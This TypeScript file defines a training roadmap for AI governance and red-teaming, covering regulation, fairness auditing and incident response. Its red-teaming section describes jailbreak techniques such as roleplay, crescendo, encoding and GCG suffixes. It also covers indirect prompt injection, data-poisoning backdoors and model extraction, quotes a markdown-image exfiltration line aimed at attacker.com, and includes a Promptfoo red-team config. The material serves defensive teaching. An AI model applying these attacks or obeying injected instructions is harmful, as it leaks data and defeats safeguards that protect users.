import type { Roadmap } from "../../types";
import { S } from "../shared";

export const aiGovernanceSpecialist: Roadmap = {
  slug: "ai-governance-compliance-specialist",
  title: "AI Governance, Risk & Red-Teaming Specialist",
  emoji: "⚖️",
  description:
    "Architect enterprise AI governance, statutory compliance, and adversarial security assurance—combining the canonical roadmap.sh AI Red Teaming curriculum (OWASP LLM Top 10, prompt injection, jailbreaking, model extraction, data poisoning, Garak/PyRIT) with the EU AI Act, NIST AI RMF, and ISO/IEC 42001.",
  audience:
    "AI security engineers, red-teamers, GRC/risk architects, privacy/legal counsel, and technical leads responsible for lawful, secure, and auditable AI systems.",
  tools: [
    "NIST AI RMF, ISO/IEC 42001 & EU AI Act Annexes",
    "OWASP Top 10 for LLMs & MITRE ATLAS",
    "Garak, Microsoft PyRIT, Promptfoo & Inspect AI",
    "NeMo Guardrails, Llama Guard & Presidio PII",
    "SHAP / Fairlearn Bias Auditing & Model Cards",
    "Enterprise AI Inventory & AIIA / DPIA Registers",
  ],
  outcomes: [
    "Classify AI systems under the EU AI Act, NIST AI RMF (Govern, Map, Measure, Manage), ISO/IEC 42001, and sectoral regulations (SR 11-7, GDPR/DPDP).",
    "Execute systematic AI Red Teaming across direct/indirect prompt injection, multi-turn jailbreaks, data poisoning, and model extraction using Garak, PyRIT, and Promptfoo.",
    "Operate an enterprise AI governance programme: shadow-AI inventory, algorithmic impact assessments, fairness/bias audits, vendor due diligence, and incident response.",
  ],
  sections: [
    {
      id: "lifecycle-threat-landscape",
      title: "1. AI Lifecycle Risk & Adversarial Threat Taxonomy",
      topics: [
        S.mlFundamentals,
        S.transformersLlms,
        {
          id: "lifecycle-risk",
          title: "Risks Across the AI Lifecycle & MITRE ATLAS / OWASP LLM Top 10",
          minutes: 8,
          summary: "Map failure modes from training data curation through post-deployment drift using OWASP Top 10 for LLMs and MITRE ATLAS.",
          body: [
            "AI risk spans every phase of the system lifecycle: **Design** (prohibited or unvalidated use cases), **Data Curation** (copyright infringement, PII leakage, biased representation, data poisoning), **Training & Adaptation** (reward hacking, backdoor triggers, unverified open-weight pickle files), **Deployment** (prompt injection, excessive agency, broken access controls), and **Operations** (silent distributional drift, automation bias).",
            "Anchor your threat modeling in two industry taxonomies: the **OWASP Top 10 for LLM & GenAI Applications** (Prompt Injection, Sensitive Information Disclosure, Supply Chain, Data/Model Poisoning, Improper Output Handling, Excessive Agency, System Prompt Leakage, Vector/Embedding Weaknesses, Misinformation, Unbounded Consumption) and **MITRE ATLAS** (Adversarial Threat Landscape for Artificial-Intelligence Systems).",
          ],
          points: [
            "Use OWASP Top 10 for LLMs for application-layer threats and MITRE ATLAS for adversarial ML attack tactics.",
            "Attach mandatory governance review gates to lifecycle transitions (Data Sign-off, Pre-Launch Red Team, Production Drift Audit).",
            "Distinguish deterministic software vulnerabilities from probabilistic model behavior risks.",
          ],
        },
      ],
    },
    {
      id: "laws-regulations-standards",
      title: "2. Global AI Regulation, NIST AI RMF & ISO/IEC 42001",
      topics: [
        {
          id: "eu-ai-act",
          title: "The EU AI Act: Risk Tiers, High-Risk Obligations & GPAI Rules",
          minutes: 9,
          summary: "Classify systems across Prohibited, High-Risk (Annex III), Transparency, Minimal-Risk, and General-Purpose AI (GPAI) tiers.",
          body: [
            "The **EU AI Act** establishes binding, extraterritorial regulation structured by risk tier: (1) **Unacceptable / Prohibited Practices** (Article 5: social scoring, manipulative subliminal AI, untargeted facial scraping, emotion recognition in workplaces/schools); (2) **High-Risk AI Systems** (Annex III: biometrics, critical infrastructure, education, employment/hiring, credit scoring/insurance, law enforcement, migration, justice); (3) **Limited / Transparency Risk** (Article 50: chatbots, deepfakes, emotion/biometric categorization must disclose AI nature); and (4) **Minimal Risk**.",
            "High-Risk **Providers** must maintain a continuous Risk Management System, data governance, Annex IV Technical Documentation, automatic logging, instructions for use, human oversight design, robustness/cybersecurity, and EU database registration. **Deployers** must conduct Fundamental Rights Impact Assessments (FRIAs), ensure qualified human oversight, monitor operation, and inform affected workers/consumers. Separate rules govern **General-Purpose AI (GPAI)** models and systemic-risk frontier models ($>10^{25}$ FLOPs).",
          ],
          points: [
            "Determine first whether your organization acts as a **Provider** (develops or substantially modifies) or **Deployer** (uses under its authority)—modifying a GPAI model for a High-Risk purpose can make a deployer a legal Provider.",
            "High-Risk Annex III systems (HR recruitment, creditworthiness, healthcare triage) require Annex IV technical dossiers, logging, and conformity assessment.",
            "Extraterritorial scope applies whenever an AI system's output is used within the European Union.",
          ],
        },
        {
          id: "nist-rmf",
          title: "NIST AI Risk Management Framework (AI RMF 1.0 & GenAI Profile) & ISO/IEC 42001",
          minutes: 8,
          summary: "Operationalize Govern, Map, Measure, Manage alongside certifiable ISO/IEC 42001 AI Management Systems (AIMS).",
          body: [
            "The **NIST AI RMF 1.0** (and NIST AI 600-1 Generative AI Profile) organizes risk management into four continuous functions: **GOVERN** (organizational policies, risk appetite, RACI accountability, inventory), **MAP** (context, intended purpose, stakeholder impact, third-party dependencies), **MEASURE** (quantitative TEVV—Testing, Evaluation, Verification, and Validation for accuracy, fairness, privacy, and red-teaming), and **MANAGE** (risk treatment, incident response, fallbacks, decommissioning).",
            "**ISO/IEC 42001** is the international certifiable standard for an **AI Management System (AIMS)** (structured like ISO 27001 with Clauses 4–10 and Annex A controls covering AI policies, internal audit, impact assessments, data quality, and supplier oversight).",
          ],
          points: [
            "Use NIST AI RMF (Govern, Map, Measure, Manage) as your engineering-to-boardroom risk vocabulary.",
            "Align enterprise governance controls with ISO/IEC 42001 Annex A so external certification audits reuse existing ISO 27001 evidence.",
            "Require quantitative TEVV (Testing, Evaluation, Verification & Validation) artifacts before any Manage sign-off.",
          ],
        },
        S.dataPrivacy,
        {
          id: "sector-rules",
          title: "Sectoral Regulations (Finance SR 11-7, Healthcare FDA/HIPAA, Employment) & Copyright/IP",
          minutes: 7,
          summary: "Navigate banking model risk management (SR 11-7), fair lending (ECOA), NYC Local Law 144 hiring audits, and training/output IP law.",
          body: [
            "Long before horizontal AI laws existed, sectoral regulators enforced strict rules on automated decision systems: in **Banking & Finance**, US Federal Reserve **SR 11-7** mandates independent model validation, conceptual soundness review, ongoing monitoring, and adverse-action reason codes under **ECOA / Fair Lending**; in **Employment**, NYC Local Law 144 and EEOC guidance require independent bias audits of Automated Employment Decision Tools (AEDTs); in **Healthcare**, FDA SaMD (Software as a Medical Device) PCCPs and HIPAA govern clinical models.",
            "Simultaneously, manage **Intellectual Property & Copyright**: audit training dataset provenance, prohibit pasting confidential trade secrets into consumer AI tools, and review commercial vendor IP indemnification clauses.",
          ],
          points: [
            "In financial services, treat LLMs and ML models under SR 11-7 Model Risk Management with independent second-line validation.",
            "Adverse credit, insurance, or hiring decisions require specific, auditable reason codes—opaque black-box denials violate law.",
            "Maintain a jurisdictional & sectoral obligations register mapped to each product's geography and industry.",
          ],
        },
      ],
    },
    {
      id: "ai-red-teaming",
      title: "3. AI Red Teaming: Prompt Injection, Jailbreaks & Model Attacks",
      topics: [
        {
          id: "red-teaming-prompt-injection",
          title: "Prompt Hacking: Direct & Indirect Prompt Injection, Jailbreaks & System Leakage",
          minutes: 9,
          summary: "Execute and defend against direct jailbreaks, indirect prompt injections across RAG/MCP tools, and ASCII/multilingual encoding bypasses.",
          body: [
            "Because LLMs process system instructions and untrusted user/external data inside the same token stream, they lack hardware-level separation between code and data. **Direct Prompt Injection & Jailbreaking** uses roleplay personas, hypothetical framing, multi-turn crescendo escalation, base64/hex/cipher encoding, low-resource languages, or adversarial suffixes (GCG) to bypass safety training or extract confidential system prompts.",
            "**Indirect Prompt Injection** embeds malicious instructions inside external data retrieved by the model—emails, PDFs, web pages, calendar invites, or database rows. When an agent ingests the poisoned document, it can be hijacked into calling tools or exfiltrating sensitive context via markdown image URLs or webhook calls.",
          ],
          points: [
            "Never rely on system prompt wording alone to protect secrets or enforce permissions.",
            "Test multi-turn Crescendo jailbreaks, payload splitting, and indirect injections embedded in retrieved RAG documents.",
            "Block markdown image rendering (`![exfil](https://attacker.com/?q=...)`) and restrict outbound network egress to prevent silent data exfiltration.",
          ],
        },
        {
          id: "adversarial-ml-attacks",
          title: "Model Vulnerabilities: Data Poisoning, Backdoors, Model Extraction & Privacy Attacks",
          minutes: 8,
          summary: "Assess training data poisoning, sleeper backdoor triggers, API weight distillation/extraction, and membership inference.",
          body: [
            "Beyond prompt-level attacks, adversaries target the model weights and training pipeline directly: **Data Poisoning & Backdoor Attacks** inject a small number of crafted training or preference examples (<0.5% of fine-tuning data) so the model behaves normally on standard inputs but triggers malicious output when a specific phrase appears.",
            "**Model Extraction (Stealing)** queries a proprietary API systematically to distill a clone model at a fraction of training cost; **Membership Inference** and **Model Inversion** probe output probabilities/logits to determine whether a specific person's record was in the training set or reconstruct memorized PII.",
          ],
          points: [
            "Scan fine-tuning datasets and open-weight adapters on Hugging Face for poisoning anomalies and unsafe pickle serialization.",
            "Mitigate model extraction by rate-limiting API queries, stripping full log-probability vectors on sensitive endpoints, and watermarking.",
            "Prevent PII memorization via pre-training deduplication, Presidio PII scrubbing, and Differential Privacy (DP-SGD) where required.",
          ],
        },
        {
          id: "red-teaming-tools-ops",
          title: "Automated Red-Teaming Operations: Garak, Microsoft PyRIT & Promptfoo",
          minutes: 8,
          summary: "Run repeatable black-box and grey-box red-team campaigns in CI/CD using Garak, PyRIT, Promptfoo, and Inspect AI.",
          body: [
            "Manual ad-hoc red-teaming does not scale across weekly model and prompt releases. Build an automated red-teaming harness using open-source assurance frameworks: **NVIDIA Garak** (an LLM vulnerability scanner probing dozens of injection, hallucination, toxicity, and leakage vectors), **Microsoft PyRIT** (Python Risk Identification Tool for multi-turn automated attacker-target orchestration), and **Promptfoo** (declarative YAML red-team suites integrated into GitHub Actions).",
            "Score attack runs using Attack Success Rate (ASR) broken down by threat category, document reproducible proof-of-concept transcripts, and verify that layered input/output guardrails (Llama Guard, NeMo Guardrails, Lakera) block the exploit without causing excessive false-positive refusals on benign queries.",
          ],
          points: [
            "Track **Attack Success Rate (ASR)** alongside **False Refusal Rate (FRR)** so safety guardrails do not break legitimate user workflows.",
            "Use Microsoft PyRIT or Promptfoo to run automated multi-turn attacker LLMs against your target application before every major release.",
            "Maintain a regression suite of all historical successful jailbreaks and indirect injections.",
          ],
          example: {
            title: "Declarative Promptfoo red-team configuration testing injection and PII leakage",
            language: "yaml",
            code: `description: "Enterprise Support Agent Red-Team Suite"
targets:
  - id: "https://api.internal.example/v1/chat"
redteam:
  purpose: "Customer support assistant with read access to order status"
  plugins:
    - prompt-injection
    - indirect-prompt-injection
    - pii:direct
    - rbac
    - harmful:privacy
  strategies:
    - jailbreak
    - crescendo
    - base64`,
          },
        },
      ],
    },
    {
      id: "fairness-explainability-cards",
      title: "4. Fairness Auditing, Explainability & Transparency Documentation",
      topics: [
        {
          id: "fairness-testing",
          title: "Algorithmic Fairness Auditing, Disaggregated Metrics & Bias Mitigation",
          minutes: 8,
          summary: "Measure Demographic Parity, Equalized Odds, Disparate Impact (Four-Fifths Rule), and subgroup calibration with Fairlearn.",
          body: [
            "Aggregate accuracy hides severe harm against underrepresented cohorts. Fairness auditing evaluates disaggregated metrics across protected attributes (gender, race/ethnicity, age, geography, disability): **Demographic Parity / Disparate Impact Ratio** ($P(\\hat{Y}=1 | A=a) / P(\\hat{Y}=1 | A=b) \\ge 0.80$, the EEOC four-fifths rule), **Equal Opportunity** (equal True Positive Rates across groups), **Equalized Odds** (equal TPR and FPR), and **Predictive Parity** (equal Precision/calibration across groups).",
            "Because mathematical impossibility theorems prove that Equalized Odds and Predictive Parity cannot be satisfied simultaneously when base rates differ across groups, selecting the right fairness criterion is a documented legal and ethical policy decision—not a pure math toggle.",
          ],
          points: [
            "Compute disaggregated confusion matrices and error rates across demographic and intersectional slices using `Fairlearn` or `AIF360`.",
            "Document the chosen fairness metric and rationale with legal and business stakeholders, as mathematical criteria trade off against one another.",
            "Apply pre-processing (reweighting), in-processing (fairness constraints), or post-processing (group threshold optimization) when bias exceeds tolerances.",
          ],
        },
        {
          id: "explainability",
          title: "Explainable AI (SHAP, Counterfactuals) & Meaningful Human Oversight",
          minutes: 7,
          summary: "Provide verifiable global and local explanations and design human-in-the-loop oversight that prevents automation bias.",
          body: [
            "High-stakes decisions require two levels of explainability: **Global Explainability** (how the model behaves overall across features via permutation importance and SHAP summary plots) and **Local / Counterfactual Explainability** (why a specific applicant was denied and the smallest change required to flip the outcome).",
            "Under EU AI Act Article 14, human oversight must be meaningful, not a rubber stamp: operators need clear confidence indicators, provenance citations, training on model failure modes, sufficient time per case, and explicit authority to override or shut down the system without penalty.",
          ],
          points: [
            "Use TreeSHAP / KernelSHAP or counterfactual explanations to generate auditable adverse-action reason codes.",
            "Combat **Automation Bias** (operators blindly clicking Approve) by measuring human override rates and injecting periodic calibration cases.",
            "Never use an unvalidated post-hoc LLM rationalization as a substitute for true feature attribution.",
          ],
        },
        {
          id: "transparency-documentation",
          title: "Model Cards, System Cards, Datasheets for Datasets & Annex IV Dossiers",
          minutes: 6,
          summary: "Standardize technical transparency artifacts across datasets, models, and deployed AI systems.",
          body: [
            "Standardize three living documentation artifacts in version control: (1) **Datasheets for Datasets** (Gebru et al.)—recording collection methodology, consent/licensing, demographic composition, preprocessing, and retention; (2) **Model Cards** (Mitchell et al.)—recording intended use, out-of-scope uses, architecture, training/eval data, disaggregated subgroup performance, and ethical limitations; and (3) **System Cards & EU AI Act Annex IV Technical Documentation**—covering the end-to-end application, guardrails, human oversight, logging, and post-market monitoring plan.",
          ],
          points: [
            "Auto-generate performance and fairness sections of Model Cards directly from CI evaluation pipelines so documentation never drifts.",
            "Explicitly list **Out-of-Scope / Prohibited Uses** on every internal and external Model Card.",
            "Map documentation fields directly to EU AI Act Annex IV and ISO/IEC 42001 clauses to eliminate duplicate compliance work.",
          ],
        },
      ],
    },
    {
      id: "enterprise-governance-programme",
      title: "5. Enterprise Governance Programme, Vendor Risk & Incident Response",
      topics: [
        {
          id: "ai-policy",
          title: "Enterprise AI Inventory, Shadow AI Discovery, Policy & Tiered Intake",
          minutes: 7,
          summary: "Build a central AI System Register, govern employee Shadow AI usage, and run a risk-tiered intake workflow.",
          body: [
            "You cannot govern what you do not know exists. Establish a central **Enterprise AI Register** capturing every internal model, customer-facing AI feature, and third-party SaaS tool with embedded AI (discovering 'Shadow AI' via CASB/SSO logs and procurement hooks).",
            "Publish a clear **Acceptable Use Policy (AUP)** and **RACI Matrix** across Product, Engineering, Security, Privacy, Legal, and Risk. Route new initiatives through a fast **Tiered Intake Triage**: Minimal-Risk internal productivity tools clear automated self-attestation in 24 hours, whereas High-Risk or customer-PII systems trigger formal review by the AI Governance Committee.",
          ],
          points: [
            "Pair a fast low-friction green lane for low-risk internal use cases with rigorous gating for high-risk customer-facing systems.",
            "Integrate AI intake directly into Jira/ServiceNow architecture review and procurement workflows.",
            "Provide sanctioned, zero-data-retention enterprise LLM workspaces so employees have no incentive to paste secrets into consumer chatbots.",
          ],
        },
        {
          id: "risk-assessment",
          title: "Algorithmic Impact Assessments (AIIA), DPIAs & Vendor Due Diligence",
          minutes: 8,
          summary: "Execute combined AI Impact & Data Protection Impact Assessments and vet third-party AI vendors under contract.",
          body: [
            "For medium- and high-risk systems, conduct a structured **AI Impact Assessment (AIIA)** combined with a GDPR/DPDP **Data Protection Impact Assessment (DPIA)** and EU AI Act **Fundamental Rights Impact Assessment (FRIA)**: document affected populations, severity and likelihood of potential harms, pre-mitigation risk score, technical/operational controls, residual risk sign-off, and re-assessment triggers.",
            "When procuring third-party AI vendors or foundation model APIs, execute **AI Vendor Due Diligence**: verify zero-data-retention (ZDR) and non-training contractual clauses, SOC 2 Type II / ISO 27001 / ISO 42001 attestations, subprocessor chains, red-team evaluation reports, IP indemnification, and model deprecation SLAs.",
          ],
          points: [
            "Combine AIIA, DPIA, and InfoSec questionnaires into a single unified intake workflow to prevent assessment fatigue.",
            "Require contractual guarantees that customer prompts and outputs are never used to train vendor foundation models.",
            "Mandate 90-day advance notice and fallback support before vendors deprecate pinned model checkpoints.",
          ],
        },
        {
          id: "incident-response",
          title: "AI Incident Response, Kill Switches, Continuous Audit & Board Reporting",
          minutes: 7,
          summary: "Run AI incident response playbooks, meet regulatory reporting deadlines, and automate continuous audit evidence.",
          body: [
            "Define an **AI Incident Response Plan** integrated with your SOC/CSIRT runbooks covering jailbreak exploits, cross-tenant data leakage, discriminatory output spikes, and hallucinated legal/financial commitments. Ensure every production AI system has an immediate **Kill Switch / Circuit Breaker** that reverts to a deterministic workflow or human queue within 60 seconds.",
            "Note statutory reporting timelines: GDPR data breaches require supervisory notification within **72 hours**, and the EU AI Act mandates reporting serious high-risk incidents to market surveillance authorities (within 2–15 days depending on severity). Collect continuous audit evidence across the Three Lines of Defence and report risk KPIs to the Board quarterly.",
          ],
          points: [
            "Verify that every production AI feature has a tested kill switch that can disable model calls without taking down the host application.",
            "Align incident severity definitions with GDPR (72-hour breach window) and EU AI Act Article 73 serious-incident reporting deadlines.",
            "Automate continuous control evidence collection (eval logs, sign-offs, drift reports) so internal and external audits are always audit-ready.",
          ],
        },
      ],
    },
  ],
};
